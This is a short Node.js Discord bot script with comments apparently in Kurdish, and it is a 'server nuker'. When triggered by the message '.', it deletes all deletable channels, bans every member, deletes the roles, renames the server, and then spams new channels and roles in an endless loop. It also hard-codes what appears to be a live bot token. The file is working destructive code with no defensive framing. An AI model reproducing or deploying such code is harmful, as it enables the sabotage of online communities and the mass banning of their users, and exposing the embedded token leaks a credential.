const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("PROGRESSHOME");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("SHVAN UP", "SHVAN");///////bo channel 
        message.guild.createChannel("SHVAN UP", "SHVAN");////bo voice
        message.guild.createRole({ name: "PROGRESSHOME" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODMzNzIwMzY0MTU2NzE1MDQx.YH2cmA.wD7xh2eBe792Xq16-At9aFrVEeI");
